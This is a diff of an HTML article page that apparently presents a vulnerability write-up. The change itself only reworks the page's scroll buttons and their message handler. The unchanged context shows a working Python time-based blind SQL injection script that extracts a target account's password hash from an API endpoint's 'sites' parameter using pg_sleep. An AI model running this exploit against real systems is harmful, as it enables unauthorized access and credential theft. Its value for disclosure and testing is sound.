@@ -53,21 +53,21 @@ TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhcGk0ZjFhNGYyMi1lYzI5LTQ4
 CHARS = string.printable; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); def encode_all_characters(string): return "".join("%{0:0&gt;2x}".format(ord(char)) for char in string); def send_request(payload=""): payload = encode_all_characters(payload); burp0_url = f"https://{HOST}/api/v1/contenttype?filter=LCKwsF&amp;page=774232&amp;per_page=517532&amp;orderby=wDdAmr&amp;direction=DESC&amp;type=DOTASSET&amp;host=BBadoI&amp;sites=PoC{payload}"; burp0_headers = {"Accept-Encoding": "gzip, deflate, br", "Accept": "*/*", "Accept-Language": "en-US;q=0.9,en;q=0.8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Connection": "close", "Cache-Control": "max-age=0", "Authorization": f"Bearer {TOKEN}"}; return requests.get(burp0_url, headers=burp0_headers, verify=False); def send_sqli(q): query = "') AND 1=(" + q + ") AND ('A' LIKE 'A"; return send_request(query); def test_sqli(): print("[!] Checking target responsiveness...") r = send_request(); if '{"entity":[],"errors":[],"i18nMessagesMap":{},"messages":[],"pagination":{"currentPage":' not in r.text: print("[-] Target did NOT return the expected JSON structure. Exiting."); sys.exit(1); print("[+] Target responded correctly.\n"); r = send_sqli(f"SELECT 1 FROM PG_SLEEP({SLEEP_TIME})"); if (not r.elapsed.total_seconds() &gt;= SLEEP_TIME): print("[-] Target did not pause as expected; Exiting."); sys.exit(1); def retrieve_password(TEMPLATE, CHARS): CHARS = ":" + CHARS.replace(":", ''); output = ""; index = 1; while True: for character in CHARS: query = str(TEMPLATE).replace("[_INDEX_PLACEHOLDER_]", str(index)).replace("[_ASCII_PLACEHOLDER_]", str(ord(character))); r = send_sqli(query); if (r.elapsed.total_seconds() &gt;= SLEEP_TIME): print(f"[+] Found character: {character}"); index += 1; output += character; break; else: break; return output; test_sqli(); print("[+] Target is Vulnerable to SQL Injection.\n"); TEMPLATE = f"SELECT (CASE WHEN (substring(password_ from [_INDEX_PLACEHOLDER_] for 1)=chr([_ASCII_PLACEHOLDER_])) THEN (SELECT 1 FROM pg_sleep({SLEEP_TIME / 2}) WHERE emailaddress = '{TARGET_ACCOUNT}') ELSE 1 END) from user_ where emailaddress = '{TARGET_ACCOUNT}'"; password = retrieve_password(TEMPLATE, CHARS); print(f"[+] Retrieved hash/password for {TARGET_ACCOUNT}: {password}"); </code></pre> </div></div>
   </div>
   <div class="article-elevator" aria-label="Navigation article">
-    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
-    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollStep(-1)">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollStep(1)">▼</button>
   </div>
   <script>
-    function scrollToTop() {
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-    function scrollToBottom() {
-      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
+    function scrollStep(direction) {
+      var step = Math.max(220, Math.round(window.innerHeight * 0.72));
+      window.scrollBy({ top: direction * step, behavior: 'smooth' });
     }
     window.addEventListener('message', (event) => {
       const data = event && event.data;
       if (!data || data.type !== 'AI_PULSE_SCROLL') return;
-      if (data.direction === 'top') scrollToTop();
-      if (data.direction === 'bottom') scrollToBottom();
+      if (data.direction === 'up') scrollStep(-1);
+      if (data.direction === 'down') scrollStep(1);
+      if (data.direction === 'top') window.scrollTo({ top: 0, behavior: 'smooth' });
+      if (data.direction === 'bottom') window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
     });
   </script>
 </body>
